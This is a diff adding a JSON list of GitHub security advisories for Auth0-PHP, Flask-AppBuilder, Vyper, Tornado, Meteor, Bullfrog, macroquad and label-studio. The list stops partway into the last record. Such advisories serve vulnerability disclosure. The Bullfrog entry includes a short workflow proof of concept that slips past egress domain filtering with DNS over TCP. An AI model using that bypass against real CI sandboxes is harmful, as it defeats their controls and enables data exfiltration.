@@ -1,0 +1,2828 @@
+[
+  {
+    "ghsa_id": "GHSA-g98g-r7gf-2r25",
+    "cve_id": "CVE-2025-47275",
+    "url": "https://api.github.com/advisories/GHSA-g98g-r7gf-2r25",
+    "html_url": "https://github.com/advisories/GHSA-g98g-r7gf-2r25",
+    "summary": "Forgeable Encrypted Session Cookie in Apps Using Auth0-PHP SDK",
+    "description": "**Overview**\nSession cookies of applications using the Auth0-PHP SDK configured with CookieStore have authentication tags that can be brute forced, which may result in unauthorized access.\n\n**Am I Affected?**\nYou are affected by this vulnerability if you meet the following pre-conditions:\n1. Applications using the Auth0-PHP SDK, or the following SDKs that rely on the Auth0-PHP SDK:\n    a. Auth0/symfony,\n    b. Auth0/laravel-auth0,\n    c. Auth0/wordpress,\n2. Session storage configured with CookieStore.\n\n**Fix**\nUpgrade Auth0/Auth0-PHP to v8.14.0. As an additional precautionary measure, we recommend rotating your cookie encryption keys. Note that once updated, any previous session cookies will be rejected.\n\n**Acknowledgement**\nOkta would like to thank Félix Charette for discovering this vulnerability.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/auth0/auth0-PHP/security-advisories/GHSA-g98g-r7gf-2r25",
+    "source_code_location": "https://github.com/auth0/auth0-PHP",
+    "identifiers": [
+      {
+        "value": "GHSA-g98g-r7gf-2r25",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47275",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/auth0/auth0-PHP/security/advisories/GHSA-g98g-r7gf-2r25",
+      "https://github.com/auth0/laravel-auth0/security/advisories/GHSA-9fwj-9mjf-rhj3",
+      "https://github.com/auth0/symfony/security/advisories/GHSA-9wg9-93h9-j8ch",
+      "https://github.com/auth0/wordpress/security/advisories/GHSA-2f4r-34m4-3w8q",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47275",
+      "https://github.com/auth0/auth0-PHP/commit/52a79480fdb246f59dbc089b81a784ae049bd389",
+      "https://github.com/auth0/auth0-PHP/releases/tag/8.14.0",
+      "https://github.com/advisories/GHSA-g98g-r7gf-2r25"
+    ],
+    "published_at": "2025-05-16T17:48:55Z",
+    "updated_at": "2025-05-16T17:48:56Z",
+    "github_reviewed_at": "2025-05-16T17:48:55Z",
+    "nvd_published_at": "2025-05-15T22:15:18Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "auth0/auth0-php"
+        },
+        "vulnerable_version_range": ">= 8.0.0-BETA1, < 8.14.0",
+        "first_patched_version": "8.14.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "score": 9.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-287",
+        "name": "Improper Authentication"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "Sideni",
+          "id": 20672053,
+          "node_id": "MDQ6VXNlcjIwNjcyMDUz",
+          "avatar_url": "https://avatars.githubusercontent.com/u/20672053?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Sideni",
+          "html_url": "https://github.com/Sideni",
+          "followers_url": "https://api.github.com/users/Sideni/followers",
+          "following_url": "https://api.github.com/users/Sideni/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Sideni/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Sideni/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Sideni/subscriptions",
+          "organizations_url": "https://api.github.com/users/Sideni/orgs",
+          "repos_url": "https://api.github.com/users/Sideni/repos",
+          "events_url": "https://api.github.com/users/Sideni/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Sideni/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "score": 9.1
+    }
+  },
+  {
+    "ghsa_id": "GHSA-99pm-ch96-ccp2",
+    "cve_id": "CVE-2025-32962",
+    "url": "https://api.github.com/advisories/GHSA-99pm-ch96-ccp2",
+    "html_url": "https://github.com/advisories/GHSA-99pm-ch96-ccp2",
+    "summary": "Flask-AppBuilder open redirect vulnerability using HTTP host injection",
+    "description": "### Impact\nFlask-AppBuilder prior to 4.6.2 would allow for a malicious unauthenticated actor to perform an open redirect by manipulating the Host header in HTTP requests.\n \n### Patches\nFlask-AppBuilder 4.6.2 introduced the `FAB_SAFE_REDIRECT_HOSTS` configuration variable, which allows administrators to explicitly define which domains are considered safe for redirection.\n\nExamples:\n```\nFAB_SAFE_REDIRECT_HOSTS = [\"yourdomain.com\", \"sub.yourdomain.com\", \"*.yourcompany.com\"]\n```\n\n### Workarounds\nUse a Reverse Proxy to Enforce Trusted Host Headers\n\n### References\n_Are there any links users can visit to find out more?_",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/dpgaspar/Flask-AppBuilder/security-advisories/GHSA-99pm-ch96-ccp2",
+    "source_code_location": "https://github.com/dpgaspar/Flask-AppBuilder",
+    "identifiers": [
+      {
+        "value": "GHSA-99pm-ch96-ccp2",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-32962",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/dpgaspar/Flask-AppBuilder/security/advisories/GHSA-99pm-ch96-ccp2",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-32962",
+      "https://github.com/dpgaspar/Flask-AppBuilder/commit/32eedbbb5cb483a3e782c5f2732de4a6a650d9b6",
+      "https://github.com/advisories/GHSA-99pm-ch96-ccp2"
+    ],
+    "published_at": "2025-05-16T17:28:25Z",
+    "updated_at": "2025-05-16T17:28:26Z",
+    "github_reviewed_at": "2025-05-16T17:28:25Z",
+    "nvd_published_at": "2025-05-16T14:15:31Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "flask-appbuilder"
+        },
+        "vulnerable_version_range": "< 4.6.2",
+        "first_patched_version": "4.6.2",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+        "score": 4.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-601",
+        "name": "URL Redirection to Untrusted Site ('Open Redirect')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "mar0n0",
+          "id": 136254434,
+          "node_id": "U_kgDOCB8T4g",
+          "avatar_url": "https://avatars.githubusercontent.com/u/136254434?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/mar0n0",
+          "html_url": "https://github.com/mar0n0",
+          "followers_url": "https://api.github.com/users/mar0n0/followers",
+          "following_url": "https://api.github.com/users/mar0n0/following{/other_user}",
+          "gists_url": "https://api.github.com/users/mar0n0/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/mar0n0/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/mar0n0/subscriptions",
+          "organizations_url": "https://api.github.com/users/mar0n0/orgs",
+          "repos_url": "https://api.github.com/users/mar0n0/repos",
+          "events_url": "https://api.github.com/users/mar0n0/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/mar0n0/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+      "score": 4.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-3vcg-j39x-cwfm",
+    "cve_id": "CVE-2025-47774",
+    "url": "https://api.github.com/advisories/GHSA-3vcg-j39x-cwfm",
+    "html_url": "https://github.com/advisories/GHSA-3vcg-j39x-cwfm",
+    "summary": "Vyper's `slice()` may elide side-effects when output length is 0",
+    "description": "### Impact\nthe `slice()` builtin can elide side effects when the output length is 0, and the source bytestring is a builtin (`msg.data` or `<address>.code`). the reason is that for these source locations, the check that `length >= 1` is skipped:\nhttps://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L315-L319\n\nthe result is that a 0-length bytestring constructed with slice can be passed to `make_byte_array_copier`, which elides evaluation of its source argument when the max length is 0:\nhttps://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/codegen/core.py#L189-L191\n\nthe impact is that side effects in the `start` argument may be elided when the `length` argument is 0, e.g. `slice(msg.data, self.do_side_effect(), 0)`.\n\nthe following example illustrates how the issue would look in user code\n```vyper\ncounter: public(uint256)\n\n@external\ndef test() -> Bytes[10]:\n    b: Bytes[10] = slice(msg.data, self.side_effect(), 0)\n    return b\n\ndef side_effect() -> uint256:\n    self.counter += 1\n    return 0\n```\n\nthe severity assigned is low, since this is not a very useful pattern and unlikely to be found in user code.\n\n### Patches\n\nthe fix is tracked in https://github.com/vyperlang/vyper/pull/4645, which disallows any invocation of `slice()` with length 0, including for the ad hoc locations discussed in this advisory.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n### References\n_Are there any links users can visit to find out more?_",
+    "type": "reviewed",
+    "severity": "low",
+    "repository_advisory_url": "https://api.github.com/repos/vyperlang/vyper/security-advisories/GHSA-3vcg-j39x-cwfm",
+    "source_code_location": "https://github.com/vyperlang/vyper",
+    "identifiers": [
+      {
+        "value": "GHSA-3vcg-j39x-cwfm",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47774",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/vyperlang/vyper/security/advisories/GHSA-3vcg-j39x-cwfm",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47774",
+      "https://github.com/vyperlang/vyper/pull/4645",
+      "https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L315-L319",
+      "https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/codegen/core.py#L189-L191",
+      "https://github.com/advisories/GHSA-3vcg-j39x-cwfm"
+    ],
+    "published_at": "2025-05-16T14:13:29Z",
+    "updated_at": "2025-05-16T14:13:32Z",
+    "github_reviewed_at": "2025-05-16T14:13:29Z",
+    "nvd_published_at": "2025-05-15T18:15:38Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "vyper"
+        },
+        "vulnerable_version_range": "<= 0.4.2rc1",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+        "score": 2.9
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-691",
+        "name": "Insufficient Control Flow Management"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-7cx3-6m66-7c5m",
+    "cve_id": "CVE-2025-47287",
+    "url": "https://api.github.com/advisories/GHSA-7cx3-6m66-7c5m",
+    "html_url": "https://github.com/advisories/GHSA-7cx3-6m66-7c5m",
+    "summary": "Tornado vulnerable to excessive logging caused by malformed multipart form data",
+    "description": "### Summary\n\nWhen Tornado's ``multipart/form-data`` parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.\n\n### Affected versions\n\nAll versions of Tornado prior to 6.5.0 are affected. The vulnerable parser is enabled by default.\n\n### Solution\n\nUpgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking `Content-Type: multipart/form-data` in a proxy.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/tornadoweb/tornado/security-advisories/GHSA-7cx3-6m66-7c5m",
+    "source_code_location": "https://github.com/tornadoweb/tornado",
+    "identifiers": [
+      {
+        "value": "GHSA-7cx3-6m66-7c5m",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47287",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/tornadoweb/tornado/security/advisories/GHSA-7cx3-6m66-7c5m",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47287",
+      "https://github.com/tornadoweb/tornado/commit/b39b892bf78fe8fea01dd45199aa88307e7162f3",
+      "https://github.com/advisories/GHSA-7cx3-6m66-7c5m"
+    ],
+    "published_at": "2025-05-16T14:12:40Z",
+    "updated_at": "2025-05-16T14:12:41Z",
+    "github_reviewed_at": "2025-05-16T14:12:40Z",
+    "nvd_published_at": "2025-05-15T22:15:18Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "tornado"
+        },
+        "vulnerable_version_range": "< 6.5.0",
+        "first_patched_version": "6.5.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "Startr4ck",
+          "id": 53632236,
+          "node_id": "MDQ6VXNlcjUzNjMyMjM2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/53632236?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Startr4ck",
+          "html_url": "https://github.com/Startr4ck",
+          "followers_url": "https://api.github.com/users/Startr4ck/followers",
+          "following_url": "https://api.github.com/users/Startr4ck/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Startr4ck/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Startr4ck/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Startr4ck/subscriptions",
+          "organizations_url": "https://api.github.com/users/Startr4ck/orgs",
+          "repos_url": "https://api.github.com/users/Startr4ck/repos",
+          "events_url": "https://api.github.com/users/Startr4ck/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Startr4ck/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-qhr6-mgqr-mchm",
+    "cve_id": "CVE-2025-47285",
+    "url": "https://api.github.com/advisories/GHSA-qhr6-mgqr-mchm",
+    "html_url": "https://github.com/advisories/GHSA-qhr6-mgqr-mchm",
+    "summary": "Vyper's `concat()` builtin may elide side-effects for zero-length arguments",
+    "description": "### Impact\n`concat()` may skip evaluation of side effects when the length of an argument is zero. this is due to a fastpath in the implementation which skips evaluation of argument expressions when their length is zero:\nhttps://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L560-L562\n\nin practice, it would be very unusual in user code to construct zero-length bytestrings using an expression with side-effects, since zero-length bytestrings are typically constructed with the empty literal `b\"\"`; the only way to construct an empty bytestring which has side effects would be with the ternary operator introduced in v0.3.8, e.g. `b\"\" if self.do_some_side_effect() else b\"\"`.\n\nthe following example demonstrates how the issue would look in user code\n```vyper\ncounter: public(uint256)\n\n@external\ndef test() -> Bytes[256]:\n    a: Bytes[256] = concat(b\"\" if self.sideeffect() else b\"\", b\"aaaa\")\n    return a\n\ndef sideeffect() -> bool:\n    self.counter += 1\n    return True\n```\n\nthe severity assigned is low, since, as mentioned, this would be a very unusual pattern in user-code.\n\n### Patches\n\nfix is tracked in https://github.com/vyperlang/vyper/pull/4644\n\n### Workarounds\ndon't have side effects in expressions which construct zero-length bytestrings.\n\n### References\n_Are there any links users can visit to find out more?_",
+    "type": "reviewed",
+    "severity": "low",
+    "repository_advisory_url": "https://api.github.com/repos/vyperlang/vyper/security-advisories/GHSA-qhr6-mgqr-mchm",
+    "source_code_location": "https://github.com/vyperlang/vyper",
+    "identifiers": [
+      {
+        "value": "GHSA-qhr6-mgqr-mchm",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47285",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/vyperlang/vyper/security/advisories/GHSA-qhr6-mgqr-mchm",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47285",
+      "https://github.com/vyperlang/vyper/pull/4644",
+      "https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L560-L562",
+      "https://github.com/advisories/GHSA-qhr6-mgqr-mchm"
+    ],
+    "published_at": "2025-05-16T14:10:25Z",
+    "updated_at": "2025-05-16T14:10:26Z",
+    "github_reviewed_at": "2025-05-16T14:10:25Z",
+    "nvd_published_at": "2025-05-15T18:15:38Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "vyper"
+        },
+        "vulnerable_version_range": "<= 0.4.2rc1",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+        "score": 2.9
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-691",
+        "name": "Insufficient Control Flow Management"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "th3anatomist",
+          "id": 154340462,
+          "node_id": "U_kgDOCTMMbg",
+          "avatar_url": "https://avatars.githubusercontent.com/u/154340462?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/th3anatomist",
+          "html_url": "https://github.com/th3anatomist",
+          "followers_url": "https://api.github.com/users/th3anatomist/followers",
+          "following_url": "https://api.github.com/users/th3anatomist/following{/other_user}",
+          "gists_url": "https://api.github.com/users/th3anatomist/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/th3anatomist/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/th3anatomist/subscriptions",
+          "organizations_url": "https://api.github.com/users/th3anatomist/orgs",
+          "repos_url": "https://api.github.com/users/th3anatomist/repos",
+          "events_url": "https://api.github.com/users/th3anatomist/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/th3anatomist/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-j3v9-6gc7-vf5f",
+    "cve_id": "CVE-2025-4727",
+    "url": "https://api.github.com/advisories/GHSA-j3v9-6gc7-vf5f",
+    "html_url": "https://github.com/advisories/GHSA-j3v9-6gc7-vf5f",
+    "summary": "Meteor Affected By Inefficient Regular Expression Complexity",
+    "description": "A vulnerability was found in Meteor up to 3.2.1 and classified as problematic. This issue affects the function Object.assign of the file packages/ddp-server/livedata_server.js. The manipulation of the argument forwardedFor leads to inefficient regular expression complexity. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 3.2.2 is able to address this issue. The identifier of the patch is f7ea6817b90952baaea9baace2a3b4366fee6a63. It is recommended to upgrade the affected component.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/meteor/meteor",
+    "identifiers": [
+      {
+        "value": "GHSA-j3v9-6gc7-vf5f",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-4727",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-4727",
+      "https://github.com/meteor/meteor/issues/13713",
+      "https://github.com/meteor/meteor/pull/13721",
+      "https://github.com/meteor/meteor/commit/f7ea6817b90952baaea9baace2a3b4366fee6a63",
+      "https://github.com/meteor/meteor/releases/tag/release/METEOR%403.2.2",
+      "https://vuldb.com/?ctiid.309029",
+      "https://vuldb.com/?id.309029",
+      "https://vuldb.com/?submit.570441",
+      "https://github.com/advisories/GHSA-j3v9-6gc7-vf5f"
+    ],
+    "published_at": "2025-05-16T00:31:08Z",
+    "updated_at": "2025-05-16T17:44:55Z",
+    "github_reviewed_at": "2025-05-16T17:44:54Z",
+    "nvd_published_at": "2025-05-15T23:15:59Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "meteor"
+        },
+        "vulnerable_version_range": "<= 3.2.1",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 3.7
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+        "score": 6.3
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+      "score": 3.7
+    }
+  },
+  {
+    "ghsa_id": "GHSA-m32f-fjw2-37v3",
+    "cve_id": "CVE-2025-47775",
+    "url": "https://api.github.com/advisories/GHSA-m32f-fjw2-37v3",
+    "html_url": "https://github.com/advisories/GHSA-m32f-fjw2-37v3",
+    "summary": "Bullfrog's DNS over TCP bypasses domain filtering",
+    "description": "### Summary\n\nUsing tcp breaks blocking and allows DNS exfiltration. \n\n### PoC\n\n```\nname: test\non:\n  push:\n    branches:\n      - \"*\"\n\njobs:\n  testBullFrog:\n    runs-on: ubuntu-22.04\n    steps:\n      - name: Use google dns\n        run: |\n          sudo resolvectl dns eth0 1.1.1.1\n          resolvectl status\n      - name: Set up bullfrog to block everything\n        uses: bullfrogsec/bullfrog@1472c28724ef13ea0adc54d0a42c2853d42786b1 # v0.8.2\n        with:\n           egress-policy: block\n           allowed-domains: |\n             *.github.com\n      - name: Test connectivity\n        run: |\n          echo testing udp allowed ..\n          dig api.github.com @1.1.1.1 || :\n          echo testing tcp allowed ..\n          dig api.github.com @1.1.1.1 +tcp || :\n\n          echo testing udp not allowed\n          dig api.google.com @1.1.1.1 || :\n          echo testing tcp not allowed\n          dig api.google.com @1.1.1.1 +tcp || :\n```\n\n### Impact\n\nsandbox bypass\n\n![image](https://github.com/user-attachments/assets/fba18a17-2d49-48cd-9aae-713e95b5270d)",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/bullfrogsec/bullfrog/security-advisories/GHSA-m32f-fjw2-37v3",
+    "source_code_location": "https://github.com/bullfrogsec/bullfrog",
+    "identifiers": [
+      {
+        "value": "GHSA-m32f-fjw2-37v3",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47775",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/bullfrogsec/bullfrog/security/advisories/GHSA-m32f-fjw2-37v3",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47775",
+      "https://github.com/bullfrogsec/bullfrog/commit/ae7744ae4b3a6f8ffc2e49f501e30bf1a43d4671",
+      "https://github.com/bullfrogsec/bullfrog/releases/tag/v0.8.4",
+      "https://github.com/advisories/GHSA-m32f-fjw2-37v3"
+    ],
+    "published_at": "2025-05-15T17:23:04Z",
+    "updated_at": "2025-05-15T17:23:05Z",
+    "github_reviewed_at": "2025-05-15T17:23:04Z",
+    "nvd_published_at": "2025-05-14T16:15:28Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "actions",
+          "name": "bullfrogsec/bullfrog"
+        },
+        "vulnerable_version_range": "< 0.8.4",
+        "first_patched_version": "0.8.4",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 6.2
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-201",
+        "name": "Insertion of Sensitive Information Into Sent Data"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "vin01",
+          "id": 30344579,
+          "node_id": "MDQ6VXNlcjMwMzQ0NTc5",
+          "avatar_url": "https://avatars.githubusercontent.com/u/30344579?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/vin01",
+          "html_url": "https://github.com/vin01",
+          "followers_url": "https://api.github.com/users/vin01/followers",
+          "following_url": "https://api.github.com/users/vin01/following{/other_user}",
+          "gists_url": "https://api.github.com/users/vin01/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/vin01/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/vin01/subscriptions",
+          "organizations_url": "https://api.github.com/users/vin01/orgs",
+          "repos_url": "https://api.github.com/users/vin01/repos",
+          "events_url": "https://api.github.com/users/vin01/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/vin01/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "score": 6.2
+    },
+    "epss": {
+      "percentage": 0.00011,
+      "percentile": 0.01004
+    }
+  },
+  {
+    "ghsa_id": "GHSA-gg76-hg3v-5q6c",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-gg76-hg3v-5q6c",
+    "html_url": "https://github.com/advisories/GHSA-gg76-hg3v-5q6c",
+    "summary": "macroquad vulnerable to multiple soundness issues",
+    "description": "Several soundness issues have been reported. Resolving them doesn't seem to be considered a priority. In particular, unprincipled use of mutable statics is pervasive throughout the library, making it possible to cause use-after-free in safe code.\n\nCurrently, no fixed version is available.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/not-fl3/macroquad",
+    "identifiers": [
+      {
+        "value": "GHSA-gg76-hg3v-5q6c",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/not-fl3/macroquad/issues/333",
+      "https://github.com/not-fl3/macroquad/issues/634",
+      "https://github.com/not-fl3/macroquad/issues/723",
+      "https://github.com/not-fl3/macroquad/issues/746",
+      "https://rustsec.org/advisories/RUSTSEC-2025-0035.html",
+      "https://github.com/advisories/GHSA-gg76-hg3v-5q6c"
+    ],
+    "published_at": "2025-05-15T16:22:33Z",
+    "updated_at": "2025-05-15T16:22:33Z",
+    "github_reviewed_at": "2025-05-15T16:22:33Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "rust",
+          "name": "macroquad"
+        },
+        "vulnerable_version_range": "<= 0.4.14",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+        "score": 8.7
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-416",
+        "name": "Use After Free"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-8jhr-wpcm-hh4h",
+    "cve_id": "CVE-2025-47783",
+    "url": "https://api.github.com/advisories/GHSA-8jhr-wpcm-hh4h",
+    "html_url": "https://github.com/advisories/GHSA-8jhr-wpcm-hh4h",
+    "summary": "label-studio vulnerable to Cross-Site Scripting (Reflected) via the label_config parameter.",
